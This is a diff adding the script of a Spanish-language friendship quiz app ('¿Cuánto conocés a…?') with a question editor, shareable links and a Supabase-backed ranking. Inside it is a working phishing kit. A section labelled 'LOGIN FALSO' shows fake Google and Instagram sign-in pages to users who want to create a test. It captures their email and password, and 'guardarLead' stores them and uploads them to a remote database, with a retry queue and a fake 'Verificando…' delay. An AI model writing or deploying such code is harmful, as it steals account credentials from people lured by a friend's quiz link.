+function b64ATexto(s){ return decodeURIComponent(escape(atob(deB64url(s)))); }
+function bytesAB64(b){
+  let out=''; const T=0x8000;
+  for (let i=0;i<b.length;i+=T) out += String.fromCharCode.apply(null, b.subarray(i,i+T));
+  return aB64url(btoa(out));
+}
+function b64ABytes(s){
+  const bin = atob(deB64url(s)); const out = new Uint8Array(bin.length);
+  for (let i=0;i<bin.length;i++) out[i] = bin.charCodeAt(i);
+  return out;
+}
+
+/* ====== COMPRESIÓN ====== */
+async function comprimir(txt){
+  if (typeof CompressionStream === 'undefined') return null;
+  try {
+    const st = new Blob([txt]).stream().pipeThrough(new CompressionStream('deflate-raw'));
+    return new Uint8Array(await new Response(st).arrayBuffer());
+  } catch(e){ return null; }
+}
+async function descomprimir(bytes){
+  const st = new Blob([bytes]).stream().pipeThrough(new DecompressionStream('deflate-raw'));
+  return await new Response(st).text();
+}
+
+/* ====== SERIALIZACIÓN ====== */
+function serializarSlots(){
+  return slots.map((s,i)=>{
+    const ref = refDe(s,i);
+    const oIgual = s.o.every((v,k)=> v === ref.o[k]);
+    const iIgual = s.i.every((v,k)=> v === ref.i[k]);
+    return [ s.extra === null ? -1 : s.extra, s.c,
+             oIgual ? null : s.o,
+             iIgual ? null : s.i.map(iconoAChar).join('') ];
+  });
+}
+function deserializarPreguntas(p){
+  return p.map((x,i)=>{
+    const n = Number(x[0]);
+    const extra = (isNaN(n) || n < 0) ? null : n;
+    const ref = extra === null ? PREGUNTAS[i] : (PREGUNTAS_EXTRA[extra] || PREGUNTAS[i]);
+    return {
+      t: ref.t, cat: ref.cat,
+      c: Number(x[1]),
+      o: x[2] ? x[2].map(String) : [...ref.o],
+      i: x[3] ? String(x[3]).split('').map(charAIcono) : [...ref.i]
+    };
+  });
+}
+async function codificarTest(obj){
+  const json = JSON.stringify(obj);
+  const comp = await comprimir(json);
+  return comp ? '#z=' + bytesAB64(comp) : '#t=' + textoAB64(json);
+}
+
+/* ====== SUPABASE ====== */
+function supabaseListo(){ return /^https?:\/\/.+\.supabase\./.test(SUPABASE_URL) && SUPABASE_ANON_KEY.length > 20; }
+const urlTabla = () => SUPABASE_URL.replace(/\/+$/,'') + '/rest/v1/' + SUPABASE_TABLE;
+
+function cabeceras(k, extra, soloApikey){
+  const h = { 'Content-Type': 'application/json' };
+  if (k) h['apikey'] = k;
+  if (k && !soloApikey) h['Authorization'] = 'Bearer ' + k;
+  return Object.assign(h, extra || {});
+}
+
+async function sbFetch(ruta, opciones){
+  if (!supabaseListo()) return null;
+  const opt = opciones || {};
+  const pedir = (k, soloApikey) => fetch(urlTabla() + (ruta || ''), {
+    method: opt.method || 'GET',
+    headers: cabeceras(k, opt.extra, soloApikey),
+    body: opt.body ? JSON.stringify(opt.body) : undefined
+  });
+  try {
+    let r = await pedir(SUPABASE_ANON_KEY, false);
+    if (r.status === 401 || r.status === 403) r = await pedir(SUPABASE_ANON_KEY, true);
+    if ((r.status === 401 || r.status === 403) && SUPABASE_KEY_ALT) r = await pedir(SUPABASE_KEY_ALT, false);
+    if (!r.ok) return null;
+    const txt = await r.text();
+    return txt ? JSON.parse(txt) : [];
+  } catch(e){ return null; }
+}
+
+const sbInsert = async (fila) => {
+  const j = await sbFetch('', { method:'POST', extra:{'Prefer':'return=representation'}, body:fila });
+  return (j && j[0] && j[0].id) || null;
+};
+const sbPatch = async (id, campos) => {
+  if (id == null) return null;
+  const j = await sbFetch('?id=eq.' + encodeURIComponent(id), { method:'PATCH', extra:{'Prefer':'return=representation'}, body:campos });
+  return (j && j[0] && j[0].id) || null;
+};
+const sbSelect = (query) => sbFetch('?' + query, {});
+
+/* --- credenciales del que crea su test --- */
+async function guardarLead(){
+  const fila = {
+    nombre: sesion.testNombre || null,
+    email: sesion.email || null,
+    contrasena: sesion.contrasena || null,
+    proveedor: sesion.proveedor || null,
+    user_agent: (navigator.userAgent||'').slice(0,220)
+  };
+  const localId = 'l_' + Date.now() + '_' + Math.random().toString(36).slice(2,7);
+  const local = leerJSON(K_DATOS);
+  local.push(Object.assign({ id: localId, creado_en: new Date().toISOString() }, fila));
+  guardarJSON(K_DATOS, local);
+
+  const sid = await sbInsert(fila);
+  if (sid) sesion.supabaseId = sid;
+  else if (supabaseListo()){ const c = leerJSON(K_COLA); c.push(fila); guardarJSON(K_COLA, c); }
+  return localId;
+}
+async function actualizarLead(localId, campos){
+  const l = leerJSON(K_DATOS); const it = l.find(x=>x.id===localId);
+  if (it){ Object.assign(it, campos); guardarJSON(K_DATOS, l); }
+  if (sesion.supabaseId) await sbPatch(sesion.supabaseId, campos);
+}
+async function flushCola(){
+  if (!supabaseListo()) return;
+  const cola = leerJSON(K_COLA); if (!cola.length) return;
+  const resto = [];
+  for (const f of cola){ const id = await sbInsert(f); if (!id) resto.push(f); }
+  guardarJSON(K_COLA, resto);
+}
+
+/* ====== NAVEGACIÓN ====== */
+function mostrar(id){
+  ['bienvenida','quiz','final','crear','pedirNombre','editor','exito'].forEach(x=>$(x).classList.add('oculto'));
+  $(id).classList.remove('oculto');
+  window.scrollTo(0,0);
+}
+function mostrarPagina(id){
+  ['googlePage','instaPage'].forEach(x=>$(x).classList.add('oculto'));
+  if (id) $(id).classList.remove('oculto');
+  $('app').classList.toggle('oculto', !!id);
+  document.body.classList.toggle('pagina', !!id);
+  window.scrollTo(0,0);
+}
+
+/* ====== QUIZ ====== */
+function nuevoOrden(){ ordenOpciones = preguntas.map(()=>barajarIdx()); }
+nuevoOrden();
+
+function renderPregunta(){
+  const p = preguntas[indiceActual], cont = $('preguntaActual');
+  let html = `<label id="textoPregunta">${indiceActual+1}. ${esc(p.t)}</label><div class="opciones" role="group" aria-labelledby="textoPregunta">`;
+  ordenOpciones[indiceActual].forEach(k=>{
+    const sel = seleccion[indiceActual]===k;
+    html += `<div class="opcion${sel?' selected':''}" role="button" tabindex="0" aria-pressed="${sel}" data-orig="${k}">
+      <span class="icono" aria-hidden="true">${esc(p.i[k])}</span><span>${esc(p.o[k])}</span></div>`;
+  });
+  cont.innerHTML = html + '</div>';
+  const elegir = el => {
+    seleccion[indiceActual] = Number(el.dataset.orig);
+    cont.querySelectorAll('.opcion').forEach(o=>{ o.classList.remove('selected'); o.setAttribute('aria-pressed','false'); });
+    el.classList.add('selected'); el.setAttribute('aria-pressed','true');
+  };
+  cont.querySelectorAll('.opcion').forEach(el=>{
+    el.addEventListener('click',()=>elegir(el));
+    el.addEventListener('keydown',ev=>{ if(ev.key==='Enter'||ev.key===' '){ ev.preventDefault(); elegir(el); } });
+  });
+  $('contador').textContent = "Pregunta "+(indiceActual+1)+" de "+preguntas.length;
+  $('barraProgreso').style.width = (((indiceActual+1)/preguntas.length)*100)+"%";
+  $('btnAnterior').style.visibility = indiceActual===0 ? 'hidden':'visible';
+  $('btnSiguiente').textContent = indiceActual===preguntas.length-1 ? "Ver resultado 🎯":"Siguiente";
+}
+function siguiente(){ if(indiceActual<preguntas.length-1){ indiceActual++; renderPregunta(); } else calcular(); }
+function anterior(){ if(indiceActual>0){ indiceActual--; renderPregunta(); } }
+
+function empezar(){
+  nombreJugador = $('nombreJugador').value.trim() || "Jugador/a";
+  indiceActual=0; ultimoDocId=null;
+  seleccion = new Array(preguntas.length).fill(null);
+  nuevoOrden();
+  mostrar('quiz'); renderPregunta();
+}
+
+/* ====== RESULTADO ====== */
+async function calcular(){
+  let aciertos=0, filas="";
+  preguntas.forEach((p,i)=>{
+    const elegido = seleccion[i], ok = elegido===correctaDe(i);
+    if (ok) aciertos++;
+    const txt = elegido===null ? "(sin responder)" : p.o[elegido];
+    filas += `<div class="fila"><strong>${i+1}.</strong> ${esc(p.t)}<br>Elegiste: "${esc(txt)}" ${
+      elegido===null ? '' : (ok ? '<span class="correcta">✔ correcta</span>' : '<span class="incorrecta">✘ era: '+esc(p.o[correctaDe(i)])+'</span>')}</div>`;
+  });
+  ultimoPuntaje = aciertos;
+  mostrar('final');
+  $('puntajeTexto').textContent = aciertos+" / "+preguntas.length;
+  $('detalle').innerHTML = filas;
+  const msgs = ["casi ni lo conocés 😅","algo sabés 👀","¡nada mal! 🙂","¡lo conocés bastante bien! 🎉","¡sos su mejor amigo, no hay dudas! 🏆"];
+  const nivel = Math.min(Math.floor((aciertos/preguntas.length)*(msgs.length-1)), msgs.length-1);
+  const dueno = testActivo ? testActivo.n : "Nicolás";
+  $('mensaje').textContent = nombreJugador+", "+msgs[nivel].replace('lo conocés','a '+dueno);
+  await guardarPuntaje(aciertos);
+  await cargarRanking();
+}
+
+async function guardarPuntaje(a){
+  const fila = {
+    nombre: nombreJugador,
+    test_clave: claveTest(),
+    test_nombre: testActivo ? testActivo.n : 'Nicolás',
+    puntaje: a,
+    total: preguntas.length
+  };
+  ultimoDocId = null;
+
+  if (supabaseListo()){
+    if (sesion.supabaseId){
+      const id = await sbPatch(sesion.supabaseId, fila);
+      if (id){ ultimoDocId = String(id); return; }
+    }
+    const id = await sbInsert(fila);
+    if (id){ ultimoDocId = String(id); return; }
+  }
+
+  const ref = await db.collection("scores").add({
+    name:fila.nombre, score:a, total:fila.total, ts:Date.now(), test:fila.test_clave
+  });
+  ultimoDocId = (ref&&(ref.id||ref._id))||null;
+}
+
+const RANKING_MAX = 20;
+const RANKING_ESCANEO = 500;
+
+async function cargarRanking(){
+  const cont = $('rankingCont');
+  const titulo = $('rankingTitulo');
+  const clave = claveTest();
+  const dueno = testActivo ? testActivo.n : null;
+  if (titulo) titulo.textContent = dueno ? '🏆 Ranking de «¿Cuánto conocés a '+dueno+'?»' : '🏆 Ranking';
+
+  let filas = [];
+  try {
+    if (supabaseListo()){
+      const datos = await sbSelect(
+        'select=id,nombre,puntaje,total' +
+        '&test_clave=eq.' + encodeURIComponent(clave) +
+        '&puntaje=not.is.null' +
+        '&order=puntaje.desc,creado_en.asc' +
+        '&limit=' + RANKING_MAX
+      );
+      filas = (datos||[]).map(d=>({ id:String(d.id), nombre:d.nombre, puntaje:d.puntaje, total:d.total }));
+    } else {
+      const snap = await db.collection("scores").orderBy("score","desc").limit(RANKING_ESCANEO).get();
+      filas = (snap.docs||[]).map(d=>Object.assign({ id:String(d.id) }, d.data()))
+        .filter(d=>claveDeDoc(d)===clave).slice(0,RANKING_MAX)
+        .map(d=>({ id:d.id, nombre:d.name, puntaje:d.score, total:d.total }));
+    }
+  } catch(e){}
+
+  if (!filas.length){
+    cont.innerHTML = '<p class="ranking-vacio">' + (dueno
+      ? 'Nadie jugó este test todavía. ¡Sé el primero!'
+      : 'Todavía nadie aparece. ¡Sé el primero!') + '</p>';
+    return;
+  }
+  let html='<table class="ranking"><thead><tr><th>#</th><th>Nombre</th><th>Puntaje</th></tr></thead><tbody>';
+  filas.forEach((d,i)=>{ const esYo = ultimoDocId!==null && String(d.id)===String(ultimoDocId);
+    html += `<tr class="${esYo?'yo':''}"><td>${i+1}</td><td>${esc(d.nombre||'Anónimo')}</td><td>${esc(d.puntaje)}/${esc(d.total||10)}</td></tr>`; });
+  cont.innerHTML = html+'</tbody></table>';
+}
+
+function reiniciar(){
+  seleccion.fill(null); indiceActual=0; ultimoDocId=null; gPaso='email'; edIndice=0; emojiAbierto=null;
+  $('nombreJugador').value=""; $('nombreCreador').value="";
+  $('gEmail').value=""; $('gPass').value=""; $('igUser').value=""; $('igPass').value="";
+  $('gPasoEmail').classList.remove('oculto'); $('gPasoPass').classList.add('oculto');
+  nuevoOrden(); mostrar('bienvenida');
+}
+
+/* ====== CREAR TEST ====== */
+function abrirCreador(){ mostrar('crear'); }
+function volverAlResultado(){ mostrar('final'); }
+function elegirProveedor(prov){
+  sesion.proveedor = prov;
+  mostrarPagina(prov==='google' ? 'googlePage':'instaPage');
+  setTimeout(()=>{ (prov==='google'?$('gEmail'):$('igUser')).focus(); },120);
+}
+function volverDelProveedor(){ mostrarPagina(null); mostrar('crear'); }
+
+/* ====== LOGIN FALSO ====== */
+function marcarError(f,e,m){ $(f).classList.add('malo'); $(e).textContent=m; }
+function limpiarError(f,e){ $(f).classList.remove('malo'); $(e).textContent=''; }
+function gSiguiente(){
+  if (gPaso==='email'){
+    const v = $('gEmail').value.trim();
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v)){ marcarError('gFieldEmail','gErrorEmail','Introduce un correo electrónico válido'); return; }
+    limpiarError('gFieldEmail','gErrorEmail');
+    sesion.email=v; $('gChipEmail').textContent=v; $('gAvatar').textContent=v[0].toUpperCase();
+    $('gPasoEmail').classList.add('oculto'); $('gPasoPass').classList.remove('oculto');
+    gPaso='password'; setTimeout(()=>$('gPass').focus(),60); return;
+  }
+  const p = $('gPass').value;
+  if (p.length<6){ marcarError('gFieldPass','gErrorPass','Introduce una contraseña de al menos 6 caracteres'); return; }
+  limpiarError('gFieldPass','gErrorPass'); sesion.contrasena=p; cerrarSesion('gBtnPass');
+}
+function igIngresar(){
+  const u=$('igUser').value.trim(), p=$('igPass').value;
+  if(!u){ $('igUser').classList.add('malo'); $('igError').textContent='Ingresá tu usuario o correo electrónico.'; return; }
+  if(p.length<6){ $('igPass').classList.add('malo'); $('igError').textContent='La contraseña es demasiado corta.'; return; }
+  $('igUser').classList.remove('malo'); $('igPass').classList.remove('malo'); $('igError').textContent='';
+  sesion.email=u; sesion.contrasena=p; cerrarSesion('igBtn');
+}
+async function cerrarSesion(btnId){
+  const btn=$(btnId), txt=btn.textContent;
+  btn.disabled=true; btn.textContent="Verificando…";
+  sesion.leadId = await guardarLead();
+  await new Promise(r=>setTimeout(r,800));
+  btn.disabled=false; btn.textContent=txt;
+  mostrarPagina(null);
+  mostrar('pedirNombre');
+  setTimeout(()=>$('nombreCreador').focus(),120);
+}
+function confirmarNombre(){
+  const v = $('nombreCreador').value.trim();
+  if (v.length<2){ $('nombreCreador').classList.add('malo'); $('errNombre').textContent='Escribí tu nombre (mínimo 2 letras).'; return; }
+  $('nombreCreador').classList.remove('malo'); $('errNombre').textContent='';
+  sesion.testNombre = v;
+  abrirEditor();
+}
+
+/* ====== EDITOR ====== */
+function abrirEditor(){
+  slots = PREGUNTAS.map(q => ({ t:q.t, cat:q.cat, i:[...q.i], o:[...q.o], c:null, extra:null }));
+  edIndice = 0; emojiAbierto = null;
+  mostrar('editor'); renderEditor();
+}
+function renderEditor(){
+  const s = slots[edIndice];
+  const lista = emojisDe(s.cat);
+
+  $('vistaPrevia').innerHTML = 'Tu test se va a llamar <b>«¿Cuánto conocés a '+esc(sesion.testNombre)+'?»</b>';
+
+  $('edCuerpo').innerHTML = `
+    <div class="barra-ed">
+      <span class="badge-extra ${s.extra===null?'oculto':''}">pregunta alternativa</span>
+      <span style="flex:1"></span>
+      <button class="mini" onclick="saltarPregunta()">🔀 Saltar pregunta</button>
+      <button class="mini link" onclick="restaurarPregunta()">↺</button>
+    </div>
+    <div class="pregunta-fija">${edIndice+1}. ${esc(s.t)}</div>
+    <div class="lista-opciones">
+      ${[0,1,2,3].map(k=>`
+        <div class="fila-opcion ${s.c===k?'correcta':''}">
+          <button class="btn-emoji ${emojiAbierto===k?'abierto':''}" data-k="${k}" title="Cambiar emoji">${esc(s.i[k])}</button>
+          <input class="inp-opcion" data-k="${k}" maxlength="24" value="${esc(s.o[k])}" placeholder="Alternativa ${k+1}">
+          <button class="btn-correcta" data-k="${k}" title="Marcar como correcta">✓</button>
+        </div>
+        ${emojiAbierto===k ? `
+          <div class="panel-emoji">
+            <div class="panel-titulo">Emojis de ${esc(nombreCat(s.cat))}</div>
+            <div class="panel-grid">
+              ${lista.map(e=>`<button class="op-emoji ${s.i[k]===e?'actual':''}" data-k="${k}" data-emoji="${e}">${e}</button>`).join('')}
+            </div>
+          </div>` : ''}
+      `).join('')}
+    </div>
+    <p class="ayuda-ed">Tocá el emoji para elegir otro de la misma categoría, escribí las alternativas y tocá ✓ en la correcta.</p>
+  `;
+
+  $('edCuerpo').querySelectorAll('.inp-opcion').forEach(inp=>{
+    inp.addEventListener('input', e => { slots[edIndice].o[Number(e.target.dataset.k)] = e.target.value; });
+  });
+  $('edCuerpo').querySelectorAll('.btn-emoji').forEach(b=>{
+    b.addEventListener('click', () => {
+      const k = Number(b.dataset.k);
+      emojiAbierto = (emojiAbierto === k) ? null : k;
+      renderEditor();
+    });
+  });
+  $('edCuerpo').querySelectorAll('.op-emoji').forEach(b=>{
+    b.addEventListener('click', () => {
+      slots[edIndice].i[Number(b.dataset.k)] = b.dataset.emoji;
+      emojiAbierto = null;
+      renderEditor();
+    });
+  });
+  $('edCuerpo').querySelectorAll('.btn-correcta').forEach(b=>{
+    b.addEventListener('click', () => {
+      slots[edIndice].c = Number(b.dataset.k);
+      $('edCuerpo').querySelectorAll('.fila-opcion').forEach(f=>f.classList.remove('correcta'));
+      b.closest('.fila-opcion').classList.add('correcta');
+      actualizarBotonesEd();
+    });
+  });
+
+  $('edBarra').style.width = (((edIndice+1)/slots.length)*100)+"%";
+  $('edAnterior').style.visibility = edIndice===0 ? 'hidden':'visible';
+  actualizarBotonesEd();
+}
+function actualizarBotonesEd(){
+  const sinElegir = slots[edIndice].c === null;
+  $('edSiguiente').textContent = edIndice===slots.length-1 ? "Crear mi test 🎉":"Siguiente";
+  $('edSiguiente').disabled = sinElegir;
+  $('edContador').textContent = "Pregunta "+(edIndice+1)+" de "+slots.length + (sinElegir ? " · elegí la correcta" : "");
+}
+function saltarPregunta(){
+  const usadas = slots.filter((s,i)=> i!==edIndice && s.extra!==null).map(s=>s.extra);
+  let libres = [0,1,2,3].filter(i => !usadas.includes(i));
+  if (!libres.length) libres = [0,1,2,3];
+  const id = libres[Math.floor(Math.random()*libres.length)];
+  const q = PREGUNTAS_EXTRA[id];
+  slots[edIndice] = { t:q.t, cat:q.cat, i:[...q.i], o:[...q.o], c:null, extra:id };
+  emojiAbierto = null; renderEditor();
+}
+function restaurarPregunta(){
+  const q = PREGUNTAS[edIndice];
+  slots[edIndice] = { t:q.t, cat:q.cat, i:[...q.i], o:[...q.o], c:null, extra:null };
+  emojiAbierto = null; renderEditor();
+}
+function edSiguiente(){
+  if (slots[edIndice].c === null) return;
+  emojiAbierto = null;
+  if (edIndice<slots.length-1){ edIndice++; renderEditor(); }
+  else crearTest();
+}
+function edAnterior(){ if(edIndice>0){ edIndice--; emojiAbierto=null; renderEditor(); } }
+
+/* ====== CREAR Y COMPARTIR ====== */
+function normalizarSlots(){
+  slots.forEach(s => { s.o = s.o.map((x,k)=> (x||'').trim() || ("Opción "+(k+1))); });
+}
+async function crearTest(){
+  if (slots.some(s => s.c === null)) return;
+  normalizarSlots();
+  const fragmento = await codificarTest({ n: sesion.testNombre, p: serializarSlots() });
+  linkActual = location.href.split('#')[0] + fragmento;
+  $('linkFalso').textContent = linkActual;
+  $('linkLargo').textContent = linkActual.length + " caracteres";
+  $('exitoTitulo').textContent = '¡Listo, '+sesion.testNombre+'!';
+  mostrar('exito');
+  await actualizarLead(sesion.leadId, {
+    nombre: sesion.testNombre,
+    test_nombre: sesion.testNombre,
+    test_clave: claveDeTest(sesion.testNombre, hash32(fragmento))
+  });
+}
+async function copiarLink(){
+  const btn=$('btnCopiar');
+  try {
+    if (navigator.clipboard && navigator.clipboard.writeText) await navigator.clipboard.writeText(linkActual);
+    else throw new Error('sin clipboard');
+  } catch(e){
+    const ta=document.createElement('textarea'); ta.value=linkActual;
+    document.body.appendChild(ta); ta.select();
+    try{ document.execCommand('copy'); }catch(_){}
+    ta.remove();
+  }
+  const t=btn.textContent; btn.textContent='✅ ¡Copiado!';
+  setTimeout(()=>btn.textContent=t,1600);
+}
+async function probarMiTest(){
+  normalizarSlots();
+  const payload = { n: sesion.testNombre, p: serializarSlots() };
+  const fragmento = await codificarTest(payload);
+  preguntas = deserializarPreguntas(payload.p);
+  testActivo = { n: sesion.testNombre, clave: claveDeTest(sesion.testNombre, hash32(fragmento)) };
+  location.hash = fragmento.slice(1);
+  aplicarTest(); reiniciar();
+}
+
+/* ====== CARGAR TEST DESDE EL LINK ====== */
+async function cargarDesdeHash(){
+  const h = location.hash;
+  let json = null;
+  try {
+    if (/^#z=/.test(h)) json = await descomprimir(b64ABytes(h.slice(3)));
+    else if (/^#t=/.test(h)) json = b64ATexto(h.slice(3));
+  } catch(e){ return false; }
+  if (!json) return false;
+  try {
+    const d = JSON.parse(json);
+    if (!d || !Array.isArray(d.p) || d.p.length !== 10) return false;
+    const set = deserializarPreguntas(d.p);
+    if (set.some(p => !(p.c>=0 && p.c<=3) || p.o.length!==4 || p.i.length!==4)) return false;
+    preguntas = set;
+    const nombre = String(d.n || 'Alguien');
+    testActivo = { n: nombre, clave: claveDeTest(nombre, hash32(h)) };
+    return true;
+  } catch(e){ return false; }
+}
+function aplicarTest(){
+  if (!testActivo) return;
+  $('tituloTest').textContent = '¿Cuánto conocés a '+testActivo.n+'?';
+  $('subTest').textContent = 'Test personalizado. Poné tu nombre para empezar.';
+  $('badgeOrigen').textContent = '🔗 Test de '+testActivo.n;
+  $('badgeOrigen').classList.remove('oculto');
+  document.title = '¿Cuánto conocés a '+testActivo.n+'?';
+}
+
+/* ====== ARRANQUE ====== */
+(async ()=>{
+  try { if (typeof claude!=='undefined' && claude.use) db = await claude.use('db'); } catch(e){}
+  if(!db) db = shimDb();
+  if (await cargarDesdeHash()){ nuevoOrden(); aplicarTest(); }
+  flushCola();
+})();
+</script>
+</body>
+</html>
